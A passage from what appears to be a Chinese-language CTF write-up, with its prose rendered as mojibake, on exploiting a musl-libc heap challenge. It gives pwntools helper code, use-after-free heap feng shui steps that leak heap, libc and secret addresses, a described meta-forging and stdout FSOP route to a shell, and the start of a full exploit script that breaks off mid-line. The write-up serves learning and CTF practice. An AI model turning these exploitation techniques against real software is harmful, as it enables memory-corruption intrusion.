class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é¢˜ç›®åˆ†æ-1"><a href="#é¢˜ç›®åˆ†æ-1" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h3><p>å¾ˆå¥½ï¼Œä¸€åšé¢˜å°±åºŸï¼Œè·Ÿç€<code>sung3r</code>å¸ˆå‚…çš„æ–‡ç« æ‰ä¸€æ­¥ä¸€æ­¥çš„å¤ç°å‡ºæ¥ï¼Œè¿™é‡Œå°±å¯¹<code>sung3r</code>çš„æ–‡ç« è¿›è¡Œéƒ¨åˆ†è¡¥å……<br>éœ€è¦æ³¨æ„ï¼šéœ€è¦ç­‰<code>group</code>å†…æ‰€æœ‰<code>chunk</code>éƒ½å¤„äº<code>freed</code>æˆ–è€…<code>used</code>çŠ¶æ€æ—¶ï¼Œæ‰ä¼šå°†<code>freed</code>çŠ¶æ€çš„<code>chunk</code>è½¬æ¢æˆ<code>avaliable</code><br>å¯ä»¥çœ‹åˆ°<code>query()</code>å‡½æ•°æ¯æ¬¡æ‰“å°çš„æ•°æ®æ˜¯è¯¥å“ˆå¸Œé“¾è¡¨æœ€å¤–ä¾§ç»“ç‚¹çš„æ•°æ®ï¼Œè€Œæ’å…¥ç»“ç‚¹åˆ™æ˜¯å°†ç»“ç‚¹æ’å…¥æœ€å†…ä¾§<br>å¯ä»¥çœ‹åˆ°<code>delete()</code>å‡½æ•°å½“<code>n</code>ä¸ºå“ˆå¸Œé“¾è¡¨çš„å°¾éƒ¨ä¸”è¯¥å“ˆå¸Œé“¾è¡¨çš„ç»“ç‚¹ä¸ªæ•°å¤§äºä¸€ä¸ªæ—¶ï¼Œä¼šè·³è¿‡å¾ªç¯ç›´æ¥è¿›è¡Œ<code>free</code>ï¼Œå­˜åœ¨<code>UAF</code>æ¼æ´<br>æ¯æ¬¡<code>store</code>æ—¶ï¼Œéƒ½ä¼šç”³è¯·<code>0x30</code>å¤§å°çš„ç©ºé—´æ¥å­˜å‚¨æ”¹ç»“ç‚¹çš„ä¿¡æ¯ï¼Œè¯¥ç©ºé—´ç»“æ„ä¸ºï¼š</p><img src="/2024/01/17/musl/6.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>äº¤äº’è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">key_content, value_content, key_size=<span class="literal">None</span>, value_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">if</span> value_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        value_size = <span class="built_in">len</span>(value_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(value_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(value_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key_content, key_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key_content, key_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hash</span>(<span class="params">content</span>):</span><br><span class="line">    x = <span class="number">0x7e5</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> content:</span><br><span class="line">        x = <span class="built_in">ord</span>(c) + x * <span class="number">0x13377331</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xfff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_key</span>(<span class="params">length=<span class="number">0x10</span>, h=<span class="number">0x7e5</span></span>):  <span class="comment"># é»˜è®¤ä¸º\nå¯¹åº”çš„hash</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">        <span class="keyword">if</span> get_hash(x) == h:</span><br><span class="line">            <span class="keyword">return</span> x</span><br></pre></td></tr></table></figure><h3 id="æ³„éœ²åœ°å€"><a href="#æ³„éœ²åœ°å€" class="headerlink" title="æ³„éœ²åœ°å€"></a>æ³„éœ²åœ°å€</h3><p>è¿™é‡Œç²˜è´´<code>sung3r</code>å¸ˆå‚…å…³äº<code>group</code>å¯¹<code>chunk</code>çš„ç®¡ç†ç­–ç•¥ï¼š</p><ul><li><code>chunk</code>æŒ‰ç…§å†…å­˜å…ˆåï¼Œä¾æ¬¡åˆ†é…</li><li><code>free</code>æ‰çš„<code>chunk</code>ä¸èƒ½é©¬ä¸Šåˆ†é…</li><li>éœ€è¦ç­‰<code>group</code>å†…æ‰€æœ‰<code>chunk</code>éƒ½å¤„äº<code>freed</code>æˆ–è€…<code>used</code>çŠ¶æ€æ—¶ï¼Œæ‰ä¼šå°†<code>freed</code>çŠ¶æ€çš„<code>chunk</code>è½¬æ¢æˆ<code>avaliable</code></li><li>åˆ†é…<code>chunk</code>æ—¶ï¼Œä¼šå°†<code>user data</code>åŸŸç”¨<code>\x00</code>åˆå§‹åŒ–</li></ul><p>æ¥ä¸‹æ¥å³å¯åˆ©ç”¨å †é£æ°´æ¥è¿›è¡Œåœ°å€çš„æ³„éœ²<br>æˆ‘ä»¬é¦–å…ˆç”³è¯·éšä¾¿ç”³è¯·ä¸€ä¸ªå †å—ï¼Œæ¥é˜²æ­¢é˜²æ­¢<code>free</code>æ‰<code>group</code>æ‰€æœ‰<code>chunk</code>æ—¶ï¼Œå°†æ•´ä¸ª<code>group</code>å†…å­˜å½’è¿˜ç»™å †ç®¡ç†å™¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)  </span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥çœ‹çœ‹æ­¤æ—¶çš„<code>group</code>çš„æƒ…å†µï¼š</p><img src="/2024/01/17/musl/7.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å¯ä»¥å‘ç°ï¼Œè¯¥å­˜å‚¨<code>0x30</code>å¤§å°å †å—çš„<code>group</code>æœ€å¤šå¯ä»¥å­˜å‚¨<code>7</code>ä¸ªå †å—<br>æ¥ä¸‹æ¥ï¼Œé™¤æœ€åä¸€ä¸ªä¸ç¬¬ä¸€ä¸ª<code>chunk</code>ï¼Œå…¶ä½™å…¨éƒ¨<code>free</code>æ‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><img src="/2024/01/17/musl/8.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ¥ä¸‹æ¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><p>groupçš„å¸ƒå±€ä¸ºï¼š</p><img src="/2024/01/17/musl/9.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>å†ç”³è¯·ä¸€ä¸ªä¸â€™\nâ€™åŒhashçš„chunkï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">store(find_key(), <span class="string">b&#x27;A&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™<code>â€™\nâ€™</code>çš„å“ˆå¸Œé“¾è¡¨ä¸­å°±æœ‰ä¸¤ä¸ªå…ƒç´ ï¼Œ<code>group</code>çš„å¸ƒå±€ä¸ºï¼š</p><img src="/2024/01/17/musl/10.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æ­¤æ—¶å°†<code>key</code>ä¸º<code>â€™\nâ€™</code>çš„å †å—åˆ é™¤å¹¶å°†<code>group</code>æœªè¢«ä½¿ç”¨çš„å †å—å…¨éƒ¨<code>free</code>æ‰:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br></pre></td></tr></table></figure><p>ç”±å‰é¢çš„åˆ†æå¯ä»¥çŸ¥é“ï¼Œæ­¤æ—¶è§¦å‘çš„<code>UAF</code>æ¼æ´ï¼Œè¢«æ ‡ä¸º<code>UAF</code>çš„å †å—å³ä¸º<code>â€™\nâ€™</code>å †å—çš„<code>value</code>åŒºåŸŸï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å°†å¦ä¸€ä¸ªå †å—çš„<code>struct</code>ç»“æ„ä½“ç”³è¯·åˆ°è¿™é‡Œï¼Œä»è€Œé€šè¿‡<code>query</code>å‡½æ•°è®¿é—®<code>â€™\nâ€™</code>æ¥æ³„éœ²å‡º<code>value</code>çš„åœ°å€ã€‚æ­¤æ—¶<code>group</code>çš„å¸ƒå±€ä¸ºï¼š</p><img src="/2024/01/17/musl/11.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æœ€åç”³è¯·ä¸€ä¸ªå †å—æ³„éœ²åœ°å€ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;A\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">0x1200</span>)</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>groupå¸ƒå±€ä¸ºï¼š</p><img src="/2024/01/17/musl/12.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>åŒæ ·ï¼Œæˆ‘ä»¬ä¹Ÿèƒ½å¤Ÿç”¨ç›¸åŒçš„ç­–ç•¥å°†<code>libc</code>åŸºåœ°å€ç­‰å†…å­˜ä¿¡æ¯<code>leak</code>å‡ºæ¥<br>leakä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">store(find_key(), <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;A\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">0x1200</span>)</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">res = codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">mmap_base = u64(res[:<span class="number">8</span>]) - <span class="number">0x20</span></span><br><span class="line">chunk_addr = u64(res[<span class="number">8</span>:<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(chunk_addr - <span class="number">0x60</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0x1d0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0xf0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x200</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">libc.address = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0xb7040</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>] == <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">secret = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;mmap base: %#x&#x27;</span> % mmap_base)</span><br><span class="line">log.info(<span class="string">&#x27;chunk address: %#x&#x27;</span> % chunk_addr)</span><br><span class="line">log.info(<span class="string">&#x27;heap base: %#x&#x27;</span> % heap_base)</span><br><span class="line">log.info(<span class="string">&#x27;libc base: %#x&#x27;</span> % libc.address)</span><br><span class="line">log.info(<span class="string">&#x27;secret: %#x&#x27;</span> % secret)</span><br><span class="line"></span><br><span class="line">fake_meta_addr = mmap_base + <span class="number">0x2010</span></span><br><span class="line">fake_mem_addr = mmap_base + <span class="number">0x2040</span></span><br><span class="line">stdout = libc.address + <span class="number">0xb4280</span>  </span><br><span class="line">log.info(<span class="string">&#x27;fake_meta_addr: %#x&#x27;</span> % fake_meta_addr)</span><br><span class="line">log.info(<span class="string">&#x27;fake_mem_addr: %#x&#x27;</span> % fake_mem_addr)</span><br><span class="line">log.info(<span class="string">&#x27;stdout: %#x&#x27;</span> % stdout)</span><br></pre></td></tr></table></figure><p>æ³„éœ²å‡ºåœ°å€åï¼Œå³å¯é€šè¿‡ä¼ªé€ <code>meta_areaã€metaã€mem</code>æ¥åˆ©ç”¨<code>unlink</code>ï¼Œå®ç°ä»»æ„åœ°å€å†™ï¼Œæ­¤æ—¶å³å¯åœ¨<code>stdout</code>ä¸­å†™å…¥<code>fake file</code>ç„¶å<code>getshell</code><br>å³<code>2</code>æ¬¡<code>free</code>æ‰è‡ªå·±ä¼ªé€ çš„<code>group</code>æ¥å®ç°ä»»æ„åœ°å€åˆ†é…<br>å˜¶ï¼Œå¥½åƒæœ‰ç‚¹è¯´ä¸æ¸…ï¼Œè·Ÿç€<code>exp</code>ä¸€æ­¥ä¸€æ­¥è°ƒè¯•å³å¯çŸ¥é“è¯¦ç»†åŸç†<code>QWQ</code>ï¼Œ<code>unlink</code>çš„å’Œ<code>fsop</code>çš„åŸç†ä¸Šé¢æœ‰è®²è¿‡(æ™šç‚¹è¡¥ï¼Œå¦‚æœæœ‰æœºä¼šçš„è¯)<br>å…¶å®æˆ‘æ„Ÿè§‰<code>meta</code>çš„ä¼ªé€ å¥½åƒå¯ä»¥å½“æˆæ¨¡æ¿æ¥ä½¿ç”¨ï¼Ÿ</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;./libc.so&#x27;</span>,<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;wt.exe&#x27;</span>, <span class="string">&#x27;-w&#x27;</span>, <span class="string">&quot;0&quot;</span>, <span class="string">&quot;sp&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;.&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-d&quot;</span>, <span class="string">&quot;Ubuntu-22.04&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>]</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">key_content, value_content, key_size=<span class="literal">None</span>, value_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line">    <span class="keyword">if</span> value_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        value_size = <span class="built_in">len</span>(value_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(value_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(value_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">key_content, key_size=<span class="literal">None</span>, wait=<span class="literal">True</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    <span class="keyword">if</span> wait:</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    p.send(key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">key_content, key_size=<span class="literal">None</span></span>):</span><br><span class="line">    p.sendlineafter(<span 